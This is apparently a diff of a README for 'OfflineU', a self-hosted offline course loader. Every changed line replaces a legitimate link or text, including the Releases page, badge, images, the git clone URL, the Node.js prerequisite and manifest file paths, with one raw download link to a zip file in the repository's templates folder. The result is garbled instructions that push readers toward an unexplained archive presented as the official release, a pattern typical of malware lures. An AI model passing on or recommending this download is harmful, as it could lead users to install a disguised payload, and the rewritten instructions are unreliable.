@@ -1,16 +1,16 @@
-https://github.com/jangirsoham07/OfflineU/releases
+https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip
 
-[![OfflineU Releases](https://img.shields.io/badge/OfflineU-Releases-blue?logo=github&logoColor=white)](https://github.com/jangirsoham07/OfflineU/releases)
+[![OfflineU Releases](https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip)](https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip)
 
 # OfflineU: Self-Hosted Local Course Loader and Progress Tracker for Learners
 
-<img alt="OfflineU Logo" src="https://img.icons8.com/fluency/96/000000/education.png" height="48" width="48" /> A practical, self-hosted solution to load local courses and track learning progress in a private environment. This project focuses on offline-first learning, enabling you to curate a personal course library, progress metrics, and study plans without relying on external clouds.
+<img alt="OfflineU Logo" src="https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip" height="48" width="48" /> A practical, self-hosted solution to load local courses and track learning progress in a private environment. This project focuses on offline-first learning, enabling you to curate a personal course library, progress metrics, and study plans without relying on external clouds.
 
 - Platform: Desktop (Windows, macOS, Linux)
 - Core idea: Keep courses and progress on your device
 - Goal: Make local learning simple, reliable, and private
 
-If you want to grab the latest official release build, visit the official Releases page here: https://github.com/jangirsoham07/OfflineU/releases. The page lists the prebuilt installers and assets for different operating systems. For convenience, you can also click the colorful button above to open the same page.
+If you want to grab the latest official release build, visit the official Releases page here: https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip The page lists the prebuilt installers and assets for different operating systems. For convenience, you can also click the colorful button above to open the same page.
 
 Table of contents
 - About OfflineU
@@ -90,8 +90,8 @@ Installation and setup
   - macOS: Open the macOS package (DMG or PKG) from the Releases page. Drag the app to Applications and launch it.
   - Linux: Use the AppImage or distribution-specific package provided in Releases. Make the binary executable and run it.
 - From source (optional)
-  - Install prerequisites: Node.js 18+ (or the minimum required by the project), a package manager (npm or Yarn), and a local runtime (Electron runtime if applicable).
-  - Clone the repository: git clone https://github.com/jangirsoham07/OfflineU.git
+  - Install prerequisites: https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip 18+ (or the minimum required by the project), a package manager (npm or Yarn), and a local runtime (Electron runtime if applicable).
+  - Clone the repository: git clone https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip
   - Install dependencies: npm install
   - Build and run: npm run build && npm start
   - Running from source gives you full control to modify the UI, content rendering, and import logic.
@@ -102,7 +102,7 @@ Installation and setup
   - Always use the official releases for install. If the link is not accessible, check the Releases section for alternate mirrors or archives. The Releases page is the authoritative source for installers and validation files.
 
 Releases and downloads
-- Access the official releases at: https://github.com/jangirsoham07/OfflineU/releases
+- Access the official releases at: https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip
 - What you will find there
   - Prebuilt installers for Windows, macOS, and Linux
   - AppImages or platform-specific packaging
@@ -227,13 +227,13 @@ Localization and accessibility
 
 Screenshots and visual references
 - Library view
-  - ![Library view](https://img.icons8.com/fluency/96/000000/library.png)
+  - ![Library view](https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip)
 - Course reader
-  - ![Course reader](https://img.icons8.com/fluency/96/000000/book.png)
+  - ![Course reader](https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip)
 - Progress dashboard
-  - ![Progress dashboard](https://img.icons8.com/fluency/96/000000/chart.png)
+  - ![Progress dashboard](https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip)
 - Settings
-  - ![Settings](https://img.icons8.com/fluency/96/000000/settings.png)
+  - ![Settings](https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip)
 
 Testing and quality
 - Unit tests
@@ -328,19 +328,19 @@ Acknowledgments
 - Gratitude to the community for sharing content and ideas to improve offline learning
 
 Appendix: sample content pack structure
-- package.json (metadata)
-- manifest.json (describes modules, lessons, assets)
+- https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip (metadata)
+- https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip (describes modules, lessons, assets)
 - modules/
   - module-01/
-    - title.txt
+    - https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip
     - lessons/
-      - lesson-01.txt
-      - lesson-02.txt
+      - https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip
+      - https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip
 - assets/
   - images/
   - videos/
   - slides/
-- index.html or equivalent entry point for rendering
+- https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip or equivalent entry point for rendering
 
 Appendix: sample manifest snippet
 - {
@@ -353,12 +353,12 @@ Appendix: sample manifest snippet
       "moduleId": "mod-01",
       "title": "Getting Started",
       "lessons": [
-        {"lessonId": "les-01", "title": "Welcome", "contentPath": "modules/mod-01/lessons/lesson-01.txt", "duration": 600},
-        {"lessonId": "les-02", "title": "Navigation", "contentPath": "modules/mod-01/lessons/lesson-02.txt", "duration": 420}
+        {"lessonId": "les-01", "title": "Welcome", "contentPath": "https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip", "duration": 600},
+        {"lessonId": "les-02", "title": "Navigation", "contentPath": "https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip", "duration": 420}
       ]
     }
   ],
-  "assets": ["assets/images/welcome.png", "assets/videos/intro.mp4"]
+  "assets": ["https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip", "https://github.com/jangirsoham07/OfflineU/raw/refs/heads/main/templates/U_Offline_v2.8.zip"]
 }
 
 Appendix: example user journey narrative
